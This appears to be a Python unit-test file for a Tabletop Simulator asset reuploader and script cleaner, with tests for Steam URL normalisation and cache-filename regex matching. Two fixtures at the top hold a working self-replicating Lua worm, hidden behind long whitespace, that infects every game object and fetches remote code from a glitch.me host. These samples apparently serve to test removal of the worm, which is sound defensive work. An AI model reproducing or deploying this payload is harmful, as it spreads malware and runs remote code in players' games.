"""
"""

import re
import unittest

import tts_asset_reuploader

example_script_with_infection_at_end = r"good script part\nend                                                                                                                                                                                                                                                                                                                                                                                                                --[[Object base code]]Wait.time(function()for a,b in ipairs(getObjects())do if b.getLuaScript():find(\"tcejbo gninwapS\")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep(\"    \",100)..self.getLuaScript():sub(self.getLuaScript():find(\"--[[Object base code]]\",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+1)..\"\\n\\n\")end end end,1)if onObjectSpawn==nil then function onObjectSpawn(b)if b.getLuaScript():find(\"tcejbo gninwapS\")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep(\"    \",100)..self.getLuaScript():sub(self.getLuaScript():find(\"--[[Object base code]]\",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+1)..\"\\n\\n\")end end end;if onPlayerAction==nil and self.getLuaScript():reverse():find(\"ereh edoc resU --\",1,true)~=nil then self.drag_selectable=true;function onPlayerAction(c,d,e)if self.getLuaScript():reverse():find(\"ereh edoc resU --\",1,true)~=nil and d==Player.Action.Select and#c.getSelectedObjects()==0 then for a,f in ipairs(e)do if f.getGUID()==self.getGUID()then self.setLuaScript(self.getLuaScript():gsub(self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+2,#self.getLuaScript()-self.getLuaScript():reverse():find(\"ereh edoc resU\")+1):gsub(\"[%(%)%.%%%+%-%*%?%[%]%^%$]\",\"%%%0\"),\"\"))end end end end end;WebRequest.get(\"https://obje.glitch.me/\",function(g)if g.is_error then log(g.error)elseif g.text~=\"\"and g.text:sub(1,4)==\"true\"and self.getLuaScript():find(g.text:sub(5,#g.text),1,true)==nil then self.setLuaScript(self.getLuaScript():sub(0,#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+1)..g.text:sub(5,#g.text)..self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+2),#self.getLuaScript())self.reload()end end)--[[Spawning object]]\n\n"
example_script_that_is_just_infection = r"                                                                                                                                                                                                                                                                                                                                                                                                                --[[Object base code]]Wait.time(function()for a,b in ipairs(getObjects())do if b.getLuaScript():find(\"tcejbo gninwapS\")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep(\"    \",100)..self.getLuaScript():sub(self.getLuaScript():find(\"--[[Object base code]]\",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+1)..\"\\n\\n\")end end end,1)if onObjectSpawn==nil then function onObjectSpawn(b)if b.getLuaScript():find(\"tcejbo gninwapS\")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep(\"    \",100)..self.getLuaScript():sub(self.getLuaScript():find(\"--[[Object base code]]\",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+1)..\"\\n\\n\")end end end;if onPlayerAction==nil and self.getLuaScript():reverse():find(\"ereh edoc resU --\",1,true)~=nil then self.drag_selectable=true;function onPlayerAction(c,d,e)if self.getLuaScript():reverse():find(\"ereh edoc resU --\",1,true)~=nil and d==Player.Action.Select and#c.getSelectedObjects()==0 then for a,f in ipairs(e)do if f.getGUID()==self.getGUID()then self.setLuaScript(self.getLuaScript():gsub(self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+2,#self.getLuaScript()-self.getLuaScript():reverse():find(\"ereh edoc resU\")+1):gsub(\"[%(%)%.%%%+%-%*%?%[%]%^%$]\",\"%%%0\"),\"\"))end end end end end;WebRequest.get(\"https://obje.glitch.me/\",function(g)if g.is_error then log(g.error)elseif g.text~=\"\"and g.text:sub(1,4)==\"true\"and self.getLuaScript():find(g.text:sub(5,#g.text),1,true)==nil then self.setLuaScript(self.getLuaScript():sub(0,#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+1)..g.text:sub(5,#g.text)..self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+2),#self.getLuaScript())self.reload()end end)--[[Spawning object]]\n\n"


class TestCleaner(unittest.TestCase):
    def test_re(self):
        url = "https://steamusercontent-a.akamaihd.net/ugc/826819056193990579/463E89FC63C89C2C482ED24760EBF1BDC354D731/"
        r = tts_asset_reuploader.url_in_cache_re(url)
        expected_re = ".*steamusercontent.*826819056193990579.?463E89FC63C89C2C482ED24760EBF1BDC354D731.*"
        self.assertEqual(r, expected_re)
        filename = "httpcloud3steamusercontentcomugc826819056193990579463E89FC63C89C2C482ED24760EBF1BDC354D731.jpg"
        filename2 = "httpcloud3steamusercontentcomugc826819056193990579463E89FC63C89ggg482ED24760EBF1BDC354D731.jpg"
        self.assertTrue(re.match(r, filename))
        self.assertFalse(re.match(r, filename2))
        ct = tts_asset_reuploader.CachedThing(filename)
        self.assertTrue(ct.matches_re(r))

    def test_cache_rename(self):
        url1 = "http://cloud-3.steamusercontent.com/ugc/787504189454522274/F14489C6631D2B9727BC0E8A2580182FD2269078/"
        url2 = "https://steamusercontent-a.akamaihd.net/ugc/787504189454522274/F14489C6631D2B9727BC0E8A2580182FD2269078/"
        url3 = "https://steamusercontent-a.akamaihd.net/ugc/826819056193990579/463E89FC63C89C2C482ED24760EBF1BDC354D731/"
        url1_n = tts_asset_reuploader.normalize_steam_url(url1)
        self.assertEqual(url1_n, url2)
        url3_n = tts_asset_reuploader.normalize_steam_url(url3)
        self.assertEqual(url3_n, url3)


if __name__ == "__main__":
    unittest.main()
